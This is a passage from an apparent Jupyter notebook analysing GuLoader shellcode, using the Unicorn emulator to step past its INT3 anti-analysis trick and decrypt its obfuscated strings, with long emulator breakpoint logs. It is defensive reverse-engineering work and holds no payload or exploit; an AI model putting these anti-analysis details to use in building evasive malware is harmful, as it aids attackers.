Breakpoint detected at 0x1759e
INT 3
EIP: 0x175aa
Breakpoint detected at 0x175aa
INT 3
EIP: 0x175b4
Breakpoint detected at 0x175b4
INT 3
EIP: 0x175d7
Breakpoint detected at 0x175d7
INT 3
EIP: 0x175e8
Breakpoint detected at 0x175e8
INT 3
EIP: 0x17610
Breakpoint detected at 0x17610
INT 3
EIP: 0x17617
Breakpoint detected at 0x17617
INT 3
EIP: 0x17617
Breakpoint detected at 0x17617
INT 3
EIP: 0x17617
Breakpoint detected at 0x17617
INT 3
EIP: 0x17626
Breakpoint detected at 0x17626
INT 3
EIP: 0x17635
Breakpoint detected at 0x17635
INT 3
EIP: 0x17647
Breakpoint detected at 0x17647
INT 3
EIP: 0x17659
Breakpoint detected at 0x17659
INT 3
EIP: 0x17661
Breakpoint detected at 0x17661
INT 3
EIP: 0x17671
Breakpoint detected at 0x17671
INT 3
EIP: 0x17678
Breakpoint detected at 0x17678
INT 3
EIP: 0x17686
Breakpoint detected at 0x17686
INT 3
EIP: 0x17694
Breakpoint detected at 0x17694
INT 3
EIP: 0x176a7
Breakpoint detected at 0x176a7
INT 3
EIP: 0x176b3
Breakpoint detected at 0x176b3
INT 3
EIP: 0x176c7
Breakpoint detected at 0x176c7
INT 3
EIP: 0x1772b
Breakpoint detected at 0x1772b
INT 3
EIP: 0x1773c
Breakpoint detected at 0x1773c
INT 3
EIP: 0x17744
Breakpoint detected at 0x17744
INT 3
EIP: 0x17754
Breakpoint detected at 0x17754
INT 3
EIP: 0x17764
Breakpoint detected at 0x17764
INT 3
EIP: 0x17781
Breakpoint detected at 0x17781
INT 3
EIP: 0x1778f
Breakpoint detected at 0x1778f
INT 3
EIP: 0x177a2
Breakpoint detected at 0x177a2
INT 3
EIP: 0x177d1
Breakpoint detected at 0x177d1
INT 3
EIP: 0x177e7
Breakpoint detected at 0x177e7
INT 3
EIP: 0x177f5
Breakpoint detected at 0x177f5
INT 3
EIP: 0x1780f
Breakpoint detected at 0x1780f
INT 3
EIP: 0x1781e
Breakpoint detected at 0x1781e
INT 3
EIP: 0x17834
Breakpoint detected at 0x17834
INT 3
EIP: 0x17846
Breakpoint detected at 0x17846
INT 3
EIP: 0x1784b
Breakpoint detected at 0x1784b
INT 3
EIP: 0x17862
Breakpoint detected at 0x17862
INT 3
EIP: 0x17871
Breakpoint detected at 0x17871
INT 3
EIP: 0x17884
Breakpoint detected at 0x17884
INT 3
EIP: 0x178a1
Breakpoint detected at 0x178a1
INT 3
EIP: 0x178b4
Breakpoint detected at 0x178b4
INT 3
EIP: 0x178d1
Breakpoint detected at 0x178d1
INT 3
EIP: 0x178e6
Breakpoint detected at 0x178e6
INT 3
EIP: 0x178ef
Breakpoint detected at 0x178ef
INT 3
EIP: 0x17903
Breakpoint detected at 0x17903
INT 3
EIP: 0x17903
Breakpoint detected at 0x17903
INT 3
EIP: 0x17903
Breakpoint detected at 0x17903
INT 3
EIP: 0x1791a
Breakpoint detected at 0x1791a
INT 3
EIP: 0x1792e
Breakpoint detected at 0x1792e
INT 3
EIP: 0x1793b
Breakpoint detected at 0x1793b
INT 3
EIP: 0x1794f
Breakpoint detected at 0x1794f
INT 3
EIP: 0x17965
Breakpoint detected at 0x17965
INT 3
EIP: 0x1797a
Breakpoint detected at 0x1797a
INT 3
EIP: 0x1798c
Breakpoint detected at 0x1798c
INT 3
EIP: 0x179a3
Breakpoint detected at 0x179a3
INT 3
EIP: 0x179c6
Breakpoint detected at 0x179c6
INT 3
EIP: 0x179de
Breakpoint detected at 0x179de
INT 3
EIP: 0x179e7
Breakpoint detected at 0x179e7
INT 3
EIP: 0x179f6
Breakpoint detected at 0x179f6
INT 3
EIP: 0x17a02
Breakpoint detected at 0x17a02
</pre>
</div>
</div>

</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">arg_buff_data</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ARG_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>

<span class="n">data_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="n">arg_buff_data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">arg_buff_data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">4</span><span class="o">+</span><span class="n">data_len</span><span class="p">]</span>
<span class="n">xor_crypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-16'</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

<div class="output_wrapper">
<div class="output">

<div class="output_area">



<div class="output_text output_subarea output_execute_result">
<pre>'windir='</pre>
</div>

</div>

</div>
</div>

</div>
    

<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h5 id="Add-Code-To-Automatically-Handle-RET">
<a class="anchor" href="#Add-Code-To-Automatically-Handle-RET" aria-hidden="true"><span class="octicon octicon-link"></span></a>Add Code To Automatically Handle RET<a class="anchor-link" href="#Add-Code-To-Automatically-Handle-RET"> </a>
</h5>
</div>
</div>
</div>
    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">unicorn</span> <span class="k">as</span> <span class="nn">uc</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="c1"># This is just to print each instruction address as it's emulated</span>
<span class="k">def</span> <span class="nf">hook_int</span><span class="p">(</span><span class="n">uc_engine</span><span class="p">,</span> <span class="n">interrupt_number</span><span class="p">,</span> <span class="n">userdata</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"INT </span><span class="si">{</span><span class="n">interrupt_number</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">eip</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span>
    <span class="n">pretty_eip</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">eip</span><span class="o">-</span><span class="mh">0x10000</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"EIP: </span><span class="si">{</span><span class="n">pretty_eip</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">test</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">eip</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">test</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xcc</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Breakpoint detected at </span><span class="si">{</span><span class="n">pretty_eip</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
        <span class="n">new_eip</span> <span class="o">=</span> <span class="p">(</span><span class="n">test</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x8F</span><span class="p">)</span> <span class="o">+</span> <span class="n">eip</span>
        <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">,</span> <span class="n">new_eip</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">True</span>

<span class="n">buf</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/tmp/Guloader_stage_2.bin'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">uc_engine</span> <span class="o">=</span> <span class="n">uc</span><span class="o">.</span><span class="n">Uc</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">UC_ARCH_X86</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_MODE_32</span><span class="p">)</span>
<span class="n">STACK_ADDR</span> <span class="o">=</span> <span class="mh">0x900000</span>
<span class="n">CODE_ADDR</span> <span class="o">=</span> <span class="mh">0x10000</span>

<span class="c1"># Load shellcode into mem</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">CODE_ADDR</span><span class="p">,</span> <span class="mh">0x300000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">CODE_ADDR</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>

<span class="c1"># Set shellcode entrypoint</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">,</span> <span class="n">CODE_ADDR</span><span class="p">)</span>

<span class="c1"># Setup the stack memory</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">STACK_ADDR</span> <span class="o">-</span> <span class="mh">0x100000</span><span class="p">,</span> <span class="mh">0x200000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_ESP</span><span class="p">,</span> <span class="n">STACK_ADDR</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EBP</span><span class="p">,</span> <span class="n">STACK_ADDR</span><span class="p">)</span>


<span class="c1"># This is our hook just for fun</span>
<span class="n">hook1</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">UC_HOOK_INTR</span><span class="p">,</span> <span class="n">hook_int</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>

<span class="c1"># Setup our arguments/buffers</span>

<span class="n">EAX_BUFF</span> <span class="o">=</span> <span class="mh">0x500000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EAX_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EAX</span><span class="p">,</span> <span class="n">EAX_BUFF</span><span class="p">)</span>

<span class="c1"># This sort of works like a 'push' to push the buffer address onto the stack</span>
<span class="n">EBP_BUFF</span> <span class="o">=</span> <span class="mh">0x600000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EBP_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="n">EBP_BUFF</span><span class="p">))</span>


<span class="n">EDI_BUFF</span> <span class="o">=</span> <span class="mh">0x700000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EDI_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EDI</span><span class="p">,</span> <span class="n">EDI_BUFF</span><span class="p">)</span>


<span class="n">ARG_BUFF</span> <span class="o">=</span> <span class="mh">0x400000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">ARG_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="n">ARG_BUFF</span><span class="p">))</span>

<span class="n">FN_START</span> <span class="o">=</span> <span class="mh">0x00017571</span>  <span class="o">+</span> <span class="n">CODE_ADDR</span>
<span class="c1"># This is a trick to set a "stop" address</span>
<span class="n">FN_END</span> <span class="o">=</span> <span class="mh">0xDEADBEEF</span>

<span class="c1"># Push the "stop" address onto the stack to trigger stop on return</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="mh">0xDEADBEEF</span><span class="p">))</span>

<span class="n">uc_engine</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">FN_START</span><span class="p">,</span> <span class="n">FN_END</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="c1">#out_eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP)</span>
</pre></div>

    </div>
</div>
</div>

<div class="output_wrapper">
<div class="output">

<div class="output_area">

<div class="output_subarea output_stream output_stdout output_text">
<pre>INT 3
EIP: 0x17571
Breakpoint detected at 0x17571
INT 3
EIP: 0x17584
Breakpoint detected at 0x17584
INT 3
EIP: 0x17593
Breakpoint detected at 0x17593
INT 3
EIP: 0x1759e
Breakpoint detected at 0x1759e
INT 3
EIP: 0x175aa
Breakpoint detected at 0x175aa
INT 3
EIP: 0x175b4
Breakpoint detected at 0x175b4
INT 3
EIP: 0x175d7
Breakpoint detected at 0x175d7
INT 3
EIP: 0x175e8
Breakpoint detected at 0x175e8
INT 3
EIP: 0x17610
Breakpoint detected at 0x17610
INT 3
EIP: 0x17617
Breakpoint detected at 0x17617
INT 3
EIP: 0x17617
Breakpoint detected at 0x17617
INT 3
EIP: 0x17617
Breakpoint detected at 0x17617
INT 3
EIP: 0x17626
Breakpoint detected at 0x17626
INT 3
EIP: 0x17635
Breakpoint detected at 0x17635
INT 3
EIP: 0x17647
Breakpoint detected at 0x17647
INT 3
EIP: 0x17659
Breakpoint detected at 0x17659
INT 3
EIP: 0x17661
Breakpoint detected at 0x17661
INT 3
EIP: 0x17671
Breakpoint detected at 0x17671
INT 3
EIP: 0x17678
Breakpoint detected at 0x17678
INT 3
EIP: 0x17686
Breakpoint detected at 0x17686
INT 3
EIP: 0x17694
Breakpoint detected at 0x17694
INT 3
EIP: 0x176a7
Breakpoint detected at 0x176a7
INT 3
EIP: 0x176b3
Breakpoint detected at 0x176b3
INT 3
EIP: 0x176c7
Breakpoint detected at 0x176c7
INT 3
EIP: 0x1772b
Breakpoint detected at 0x1772b
INT 3
EIP: 0x1773c
Breakpoint detected at 0x1773c
INT 3
EIP: 0x17744
Breakpoint detected at 0x17744
INT 3
EIP: 0x17754
Breakpoint detected at 0x17754
INT 3
EIP: 0x17764
Breakpoint detected at 0x17764
INT 3
EIP: 0x17781
Breakpoint detected at 0x17781
INT 3
EIP: 0x1778f
Breakpoint detected at 0x1778f
INT 3
EIP: 0x177a2
Breakpoint detected at 0x177a2
INT 3
EIP: 0x177d1
Breakpoint detected at 0x177d1
INT 3
EIP: 0x177e7
Breakpoint detected at 0x177e7
INT 3
EIP: 0x177f5
Breakpoint detected at 0x177f5
INT 3
EIP: 0x1780f
Breakpoint detected at 0x1780f
INT 3
EIP: 0x1781e
Breakpoint detected at 0x1781e
INT 3
EIP: 0x17834
Breakpoint detected at 0x17834
INT 3
EIP: 0x17846
Breakpoint detected at 0x17846
INT 3
EIP: 0x1784b
Breakpoint detected at 0x1784b
INT 3
EIP: 0x17862
Breakpoint detected at 0x17862
INT 3
EIP: 0x17871
Breakpoint detected at 0x17871
INT 3
EIP: 0x17884
Breakpoint detected at 0x17884
INT 3
EIP: 0x178a1
Breakpoint detected at 0x178a1
INT 3
EIP: 0x178b4
Breakpoint detected at 0x178b4
INT 3
EIP: 0x178d1
Breakpoint detected at 0x178d1
INT 3
EIP: 0x178e6
Breakpoint detected at 0x178e6
INT 3
EIP: 0x178ef
Breakpoint detected at 0x178ef
INT 3
EIP: 0x17903
Breakpoint detected at 0x17903
INT 3
EIP: 0x17903
Breakpoint detected at 0x17903
INT 3
EIP: 0x17903
Breakpoint detected at 0x17903
INT 3
EIP: 0x1791a
Breakpoint detected at 0x1791a
INT 3
EIP: 0x1792e
Breakpoint detected at 0x1792e
INT 3
EIP: 0x1793b
Breakpoint detected at 0x1793b
INT 3
EIP: 0x1794f
Breakpoint detected at 0x1794f
INT 3
EIP: 0x17965
Breakpoint detected at 0x17965
INT 3
EIP: 0x1797a
Breakpoint detected at 0x1797a
INT 3
EIP: 0x1798c
Breakpoint detected at 0x1798c
INT 3
EIP: 0x179a3
Breakpoint detected at 0x179a3
INT 3
EIP: 0x179c6
Breakpoint detected at 0x179c6
INT 3
EIP: 0x179de
Breakpoint detected at 0x179de
INT 3
EIP: 0x179e7
Breakpoint detected at 0x179e7
INT 3
EIP: 0x179f6
Breakpoint detected at 0x179f6
INT 3
EIP: 0x17a02
Breakpoint detected at 0x17a02
</pre>
</div>
</div>

</div>
</div>

</div>
    

<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h4 id="Final-Automatic-String-Decryption">
<a class="anchor" href="#Final-Automatic-String-Decryption" aria-hidden="true"><span class="octicon octicon-link"></span></a>Final Automatic String Decryption<a class="anchor-link" href="#Final-Automatic-String-Decryption"> </a>
</h4>
</div>
</div>
</div>
    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">unicorn</span> <span class="k">as</span> <span class="nn">uc</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="c1"># This is just to print each instruction address as it's emulated</span>
<span class="k">def</span> <span class="nf">hook_int</span><span class="p">(</span><span class="n">uc_engine</span><span class="p">,</span> <span class="n">interrupt_number</span><span class="p">,</span> <span class="n">userdata</span><span class="p">):</span>
    <span class="c1">#print(f"INT {interrupt_number}")</span>
    <span class="n">eip</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span>
    <span class="n">pretty_eip</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">eip</span><span class="o">-</span><span class="mh">0x10000</span><span class="p">)</span>
    <span class="c1">#print(f"EIP: {pretty_eip}")</span>
    <span class="n">test</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">eip</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">test</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xcc</span><span class="p">:</span>
        <span class="c1">#print(f"Breakpoint detected at {pretty_eip}")</span>
        <span class="n">new_eip</span> <span class="o">=</span> <span class="p">(</span><span class="n">test</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x8F</span><span class="p">)</span> <span class="o">+</span> <span class="n">eip</span>
        <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">,</span> <span class="n">new_eip</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">True</span>

<span class="n">buf</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/tmp/Guloader_stage_2.bin'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">fn_address</span><span class="p">):</span>
    <span class="n">uc_engine</span> <span class="o">=</span> <span class="n">uc</span><span class="o">.</span><span class="n">Uc</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">UC_ARCH_X86</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_MODE_32</span><span class="p">)</span>
    <span class="n">STACK_ADDR</span> <span class="o">=</span> <span class="mh">0x900000</span>
    <span class="n">CODE_ADDR</span> <span class="o">=</span> <span class="mh">0x10000</span>

    <span class="c1"># Load shellcode into mem</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">CODE_ADDR</span><span class="p">,</span> <span class="mh">0x300000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">CODE_ADDR</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>

    <span class="c1"># Set shellcode entrypoint</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">,</span> <span class="n">CODE_ADDR</span><span class="p">)</span>

    <span class="c1"># Setup the stack memory</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">STACK_ADDR</span> <span class="o">-</span> <span class="mh">0x100000</span><span class="p">,</span> <span class="mh">0x200000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_ESP</span><span class="p">,</span> <span class="n">STACK_ADDR</span><span class="p">)</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EBP</span><span class="p">,</span> <span class="n">STACK_ADDR</span><span class="p">)</span>


    <span class="c1"># This is our hook just for fun</span>
    <span class="n">hook1</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">UC_HOOK_INTR</span><span class="p">,</span> <span class="n">hook_int</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>

    <span class="c1"># Setup our arguments/buffers</span>

    <span class="n">EAX_BUFF</span> <span class="o">=</span> <span class="mh">0x500000</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EAX_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EAX</span><span class="p">,</span> <span class="n">EAX_BUFF</span><span class="p">)</span>

    <span class="c1"># This sort of works like a 'push' to push the buffer address onto the stack</span>
    <span class="n">EBP_BUFF</span> <span class="o">=</span> <span class="mh">0x600000</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EBP_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="n">EBP_BUFF</span><span class="p">))</span>


    <span class="n">EDI_BUFF</span> <span class="o">=</span> <span class="mh">0x700000</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EDI_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EDI</span><span class="p">,</span> <span class="n">EDI_BUFF</span><span class="p">)</span>


    <span class="n">ARG_BUFF</span> <span class="o">=</span> <span class="mh">0x400000</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">ARG_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="n">ARG_BUFF</span><span class="p">))</span>

    <span class="n">FN_START</span> <span class="o">=</span>  <span class="n">fn_address</span> <span class="o">+</span> <span class="n">CODE_ADDR</span>
    <span class="c1"># This is a trick to set a "stop" address</span>
    <span class="n">FN_END</span> <span class="o">=</span> <span class="mh">0xDEADBEEF</span>

    <span class="c1"># Push the "stop" address onto the stack to trigger stop on return</span>
    <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="mh">0xDEADBEEF</span><span class="p">))</span>

    <span class="n">uc_engine</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">FN_START</span><span class="p">,</span> <span class="n">FN_END</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    
    <span class="c1"># Read the data buffer</span>
    <span class="n">arg_buff_data</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ARG_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>

    <span class="n">data_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="n">arg_buff_data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">arg_buff_data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">4</span><span class="o">+</span><span class="n">data_len</span><span class="p">]</span>
    <span class="n">out</span> <span class="o">=</span> <span class="n">xor_crypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">out</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">,</span><span class="sa">b</span><span class="s1">''</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>
    
</pre></div>

    </div>
</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
